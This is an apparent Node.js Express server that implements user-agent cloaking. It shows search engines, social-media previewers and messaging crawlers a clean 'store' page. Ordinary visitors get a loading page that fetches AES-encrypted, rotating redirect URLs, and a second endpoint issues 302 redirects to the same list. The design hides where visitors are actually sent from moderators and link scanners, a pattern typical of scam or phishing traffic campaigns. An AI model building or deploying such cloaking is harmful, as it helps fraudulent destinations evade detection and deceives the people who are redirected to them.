const express = require('express');
const path = require('path');
const fs = require('fs');
const CryptoJS = require('crypto-js');

const app = express();
const config = require('./config.json');

const PORT = process.env.PORT || config.port || 3000;
const HOST = process.env.HOST || '0.0.0.0';

const SECRET = process.env.SECRET_KEY || config.secretKey || 'default-secret-change-me';

const BOT_REGEX = /bot|crawl|spider|slurp|bing|google|yandex|duckduck|baidu|facebook|twitter|whatsapp|preview|linkedin|pinterest|telegram|discord|skype|embedly|quora|outbrain|vkshare|w3c_validator|reddit/i;

function isBot(req) {
    const ua = req.headers['user-agent'] || '';
    return BOT_REGEX.test(ua);
}

let currentIndex = 0;
let lastRotation = Date.now();

function getRotatingUrl() {
    const url = config.urls[currentIndex];
    currentIndex = (currentIndex + 1) % config.urls.length;
    return url;
}

function encryptUrl(url) {
    return CryptoJS.AES.encrypt(url, SECRET).toString();
}

app.set('trust proxy', 1);

app.use('/css', express.static(path.join(__dirname, 'public/css')));
app.use('/js', express.static(path.join(__dirname, 'public/js')));

app.get('/', (req, res) => {
    const htmlPath = path.join(__dirname, 'public/index.html');

    if (isBot(req)) {
        let html = fs.readFileSync(htmlPath, 'utf8');

        html = html.replace(
            /<div id="loadingPopup"[^>]*>/,
            '<div id="loadingPopup" style="display:none !important" aria-hidden="true">'
        );

        html = html.replace(
            /<div id="store"([^>]*?)class="([^"]*)"/,
            (match, before, classes) => {
                const cleaned = classes
                    .replace(/\bhidden\b/g, '')
                    .replace(/\bopacity-0\b/g, '')
                    .replace(/\s+/g, ' ')
                    .trim();
                return `<div id="store"${before}class="${cleaned} opacity-100"`;
            }
        );

        return res.type('html').send(html);
    }

    res.sendFile(htmlPath);
});

app.get('/api/config', (req, res) => {
    const plainUrl = getRotatingUrl();
    const encrypted = encryptUrl(plainUrl);

    res.json({
        encUrl: encrypted,
        interval: config.interval,
        serverTime: Date.now()
    });
});

app.get('/api/redirect', (req, res) => {
    res.redirect(302, getRotatingUrl());
});

app.get('/health', (req, res) => {
    res.status(200).json({ status: 'ok', uptime: process.uptime() });
});

app.use((req, res) => {
    res.status(404).sendFile(path.join(__dirname, 'public/index.html'));
});

app.listen(PORT, HOST, () => {
    console.log(`Server: http://${HOST}:${PORT}`);
    console.log(`${config.urls.length} URLs · interval ${config.interval}ms`);
});